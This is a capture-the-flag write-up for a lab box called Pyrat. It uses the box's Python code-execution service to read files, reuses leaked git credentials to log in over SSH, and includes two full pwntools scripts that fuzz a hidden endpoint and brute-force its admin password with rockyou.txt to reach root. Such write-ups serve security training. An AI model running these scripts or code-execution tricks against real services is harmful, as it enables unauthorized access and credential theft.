# Pyrat

I started by performing a Nmap scan:

![nmap.png](/images/reports/pyrat/nmap.png)

Opening the web app on port 8000 gives out this:

![page.png](/images/reports/pyrat/page.png)

So given the description of this box and the message on the website we need to do some manual enumeration using Python. More basic means netcat:

![nc.png](/images/reports/pyrat/nc.png)

Using the command `print(os.listdir(’/’))` and `print(open(’<filename>’, ‘r’).read())` I looked throught the directories and I found an email:

![mail.png](/images/reports/pyrat/mail.png)

Looking at the /opt directory I found the git subfolder with a config file. Inside it there are some credentials:

![git config.png](/images/reports/pyrat/git_config.png)

Using these credentials I managed to login into SSH and read the user flag:

![user flag.png](/images/reports/pyrat/user_flag.png)

Since it’s mentioned in the description that we need to look for some endpoint through Git, I first checked the status of Git and found that one file was deleted:

![git status.png](/images/reports/pyrat/git_status.png)

Next, I downloaded the repository to my machine and looked over it:

![server.png](/images/reports/pyrat/server.png)

![wget.png](/images/reports/pyrat/wget.png)

After getting the files on my machine, I once again checked the git status and restored the deleted file:

![restore.png](/images/reports/pyrat/restore.png)

I checked out the file, inside we have 2 functions: `switch_case` and `shell`. Looking over the code we get the following information: the `switch_case` function checks the parameter “data” and based on the value does 3 things. If the value of “data” is “some_endpoint”, another function called “get_this_endpoint” (this is the main interest of gaining root access) gets called. If the value of “data” is “shell” the `shell` function gets called that will then spawn a shell. For any other data the exec_python function is called that executes the Python code we enter. 

![pyrat.old.png](/images/reports/pyrat/pyrat.old.png)

I tested the shell option to see if it will work:

![shell test.png](/images/reports/pyrat/shell_test.png)

As listed in the description, I needed to research some Python script to try and fuzz the special endpoint. I got a list of endpoints from here: [https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d](https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d)

and the following script:

```jsx
from pwn import *

# Set the host and port
host = "pyrat.thm"
port = 8000

directory_file = "endpoints.txt"

# Connect to the target
def connect_to_service():
    return remote(host, port)

# Function to attempt login with a endpoint
def attempt_endpoint(endpoint):
    # Connect to the service
    conn = connect_to_service()
    # Send the endpoint from the list
    conn.sendline(endpoint.encode())

    response = conn.recvline(timeout=2)
    # Convert the endpoint to bytes before concatenating
    if b"name '" + endpoint.encode() + b"' is not defined\n" in response:
        conn.close()
        return False
    else: 
        print(f"Endpoint '{endpoint}' might be correct!")
        conn.close()
        return True

# Main function to loop through endpoint list
def fuzz_endpoints():
    with open(directory_file, "r", encoding="latin-1") as f:
        for endpoint in f:
            endpoint = endpoint.strip()
            # Skip lines starting with '#'
            if endpoint.startswith("#") or not endpoint:
            	continue
            if attempt_endpoint(endpoint):
                print(f"Found working endpoint: {endpoint}")
                break

if __name__ == "__main__":
    fuzz_endpoints()

```

After executing the script I got the endpoint “0” which is a false-positive, this also applies to special characters. I needed to remove them in order to get accurate results.

```jsx
sudo awk '
!/[[:digit:]]/ && !/[-_]/ {
gsub(/[^a-zA-Z]/, "");
if (length) print
}
' endpoints.txt | sort -u | sudo tee filtered_endpoints.txt > /dev/null
```

After doing this the script worked, I got “admin” as the endpoint:

![correct endpoint.png](/images/reports/pyrat/correct_endpoint.png)

I tested the endpoint in Netcat:

![admin test.png](/images/reports/pyrat/admin_test.png)

Apparently, after 3 tries the program doesn’t ask for the password again. Next, we adapt our previous script to fuzz for the password:

```jsx
from pwn import *

# Set the host and port
host = "pyrat.thm"
port = 8000

# File path for rockyou.txt password list
password_file = "/usr/share/wordlists/rockyou.txt"

# Connect to the target
def connect_to_service():
    return remote(host, port)

# Function to attempt login with a password
def attempt_password(password):
    # Connect to the service
    conn = connect_to_service()
    
    # Send 'admin' as the username
    conn.sendline(b"admin")
    
    # Wait for the password prompt
    conn.recvuntil(b"Password:")
    
    # Send the password from the list
    conn.sendline(password.encode())

    # Receive the response and check if we're prompted for a password again
    response = conn.recvline(timeout=2)
    response = conn.recvline(timeout=2)
    # Check if we're asked for the password again (indicates incorrect password)
    if b"Password:" in response:
        print(f"Password '{password}' failed.")
        conn.close()
        return False
    elif b"Welcome" in response or b"Success" in response:  # Adjust this based on the actual success message
        print(f"Password '{password}' might be correct!")
        conn.close()
        return True
    else:
        # Some other response that might indicate progress (adjust based on your observations)
        print(f"Unexpected response for password '{password}'. Response: {response}")
        conn.close()
        return False

# Main function to loop through password list
def fuzz_passwords():
    with open(password_file, "r", encoding="latin-1") as f:
        for password in f:
            password = password.strip()
            if attempt_password(password):
                print(f"Found working password: {password}")
                break

if __name__ == "__main__":
    fuzz_passwords()

```

After running the script I got the password:

![password.png](/images/reports/pyrat/password.png)

Using the password I got the root shell and therefore the root flag:

![root flag.png](/images/reports/pyrat/root_flag.png)